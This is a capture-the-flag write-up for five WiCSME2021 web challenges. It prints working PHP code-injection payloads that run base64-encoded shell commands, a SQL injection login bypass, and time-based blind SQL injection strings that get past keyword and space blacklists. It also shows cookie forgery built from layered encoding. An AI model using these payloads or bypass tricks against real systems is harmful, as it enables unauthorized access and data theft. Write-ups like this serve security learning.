# WiCSME2021 CTF

# web challenges:

## 1- SimPlay
![Screenshot at 2021-11-25 19-26-09](https://user-images.githubusercontent.com/52857059/143482771-46d1f5ad-c4c8-4667-882a-6d2c23525010.png)

After clicking the Try Again button :

![Screenshot at 2021-11-25 19-32-26](https://user-images.githubusercontent.com/52857059/143484789-d5764601-d715-4dda-87f6-225147275112.png)

I try php code injection ${system('ls')}

![Screenshot at 2021-11-25 19-35-36](https://user-images.githubusercontent.com/52857059/143484816-0131587c-3d6c-43f1-b947-5afac58b96ae.png)

It works But I can't find flag file.
let's try another payload with base64_decode function --> ${system(base64_decode(bHMgLi4v))}

![Screenshot at 2021-11-25 19-39-34](https://user-images.githubusercontent.com/52857059/143484886-c4cdb4ad-025d-46f2-85c7-57850b62bd3d.png)

I got flag name :")
next step , let's read flag file --> ${system(base64_decode(Y2F0IC4uL2ZsYWcq))}

![Screenshot at 2021-11-25 19-47-54](https://user-images.githubusercontent.com/52857059/143484917-bf996a6b-275b-4965-9982-0742345a348d.png)


## 2- Potent Quotes
![Screenshot at 2021-11-25 19-54-12](https://user-images.githubusercontent.com/52857059/143547317-5ee748d1-aab4-4f33-bc0e-8816ecadb6e9.png)

After downloading the files' challenge locally , I found query of input 

![Screenshot at 2021-11-26 09-53-45](https://user-images.githubusercontent.com/52857059/143547089-f06f8c4b-4749-4c33-9f31-9dc5a7249e64.png)

Let's try injecting pass input with ```html 1' or '1'='1 ```

![Screenshot at 2021-11-26 10-01-17](https://user-images.githubusercontent.com/52857059/143547148-b89b03d8-01be-44c9-97ef-8640261a8e0e.png)


## 3- INCEPTION(easy)

if we open 
```html
https://ch24.sbug.se/?src (getting ?src from page source)
```

![Screenshot at 2021-07-21 12-57-59](https://user-images.githubusercontent.com/52857059/126552622-c5f1a8db-a4ce-4e45-a9b5-3d0d2a742147.png)

```html
they are BlackList words replace them to space -->  preg_replace("/select|union|from|where/i", "", @$_GET["fname"]);
```
I thought it was sqli injection exactly blind sqli because when I injected input no error was appeared 

I bypassed these words in blacklist by wrote the same word again in the middle EX: (select ---> selselectect) 

I stared injecting with this payload , I guessed the part of column name 'pass' cause he said in description challenge (find the admin password) 

```html
1'+OR+(selselectect+sleep(10)+frofromm+dual+whewherere+(selselectect+table_name+frfromom information_schema.columns+whwhereere+table_schema=database()+and+column_name+like+'%pass%'+limit+0,1)+like+'%%')%23
```
By guessing &trying I got columns (passwd , uname , role), table (inception_users)

![Screenshot at 2021-07-21 13-01-52](https://user-images.githubusercontent.com/52857059/126554514-25f916b4-f110-4080-8e24-8baefc5f0677.png)

![Screenshot at 2021-07-21 13-02-48](https://user-images.githubusercontent.com/52857059/126554656-6954d967-9149-4d0d-a7ec-5b8d32f4b745.png)

now let's see what is in passwd column by this payload :

```html
1'+OR+(+SELselectECT+count(*)+frfromom+inception_users+whwhereere+role=+'admin'+AND+passwd+like+'%')%23
```
![Screenshot at 2021-07-21 13-05-22](https://user-images.githubusercontent.com/52857059/126555069-c55458f6-55ec-44b5-84b2-78ba3fe1aad4.png)

By guessing &trying I finally got the flag :"D
![Screenshot at 2021-07-21 13-06-03](https://user-images.githubusercontent.com/52857059/126555257-a0cbdc1e-f163-4621-8688-e77195d6e80d.png)

![Screenshot at 2021-07-21 22-53-19](https://user-images.githubusercontent.com/52857059/126559146-3d478da0-4f5a-499b-8063-efa46d01b2ba.png)

## 4- BLACKLIST(medium)

![Screenshot at 2021-07-21 15-13-53](https://user-images.githubusercontent.com/52857059/126556113-44fabb06-437f-47ce-b03d-f7244d7590e9.png)

It was the same - inception challenge - But the blacklist was space , i tried (/**/) as space but it was faild .

finally i found (/* _ */) worked as a space without waf caught it :D 
the same mechanism again ...

![Screenshot at 2021-07-21 15-15-04](https://user-images.githubusercontent.com/52857059/126556433-9d813bfc-f7ab-4658-992a-8c9c74f92d16.png)

By guessing &trying I got column (flag), table (blacklist_users)

now let's see what is in flag column by this payload :
```html
1'/*_*/or/*_*/(select/*_*/sleep(10)/*_*/from/*_*/dual/*_*/where/*_*/(select/*_*/flag/*_*/from/*_*/blacklist_users)/*_*/like/*_*/'%')%23
```
By guessing &trying I finally got the flag :"D

![Screenshot at 2021-07-21 15-14-22](https://user-images.githubusercontent.com/52857059/126556925-a5f3f320-25a5-4161-b90a-a288d977200f.png)

## 5- BUY THE FLAG(easy)

this challenge depend on decreption let's see it .
![Screenshot at 2021-07-21 22-41-03](https://user-images.githubusercontent.com/52857059/126557249-e4722ab1-47e7-48fa-ad35-6a9f4eb9d8e9.png)

With a little care we notice that by changing the cookie it returns to the original value so it is sensitive to cookies according to the cookie
```html
Cookie:3054505242564F465A55567A59456257644662475647644B5A56597759466255426A57735A315431305756584A6C566A746B567759565531736D5956683261546C58557849474E78306D56
```
then by unhexing and reversing and decoding base64 5 times , we will get 
```html
User_is_=Fread
```
now we have to change value to Us3r & encrept User_is_=Us3r hexing & reversing and encoding base64 5 times
after that u will get the flag 

![Screenshot at 2021-07-21 16-20-32](https://user-images.githubusercontent.com/52857059/126558141-f3f012a4-3f41-4d53-9791-f88a2961025d.png)

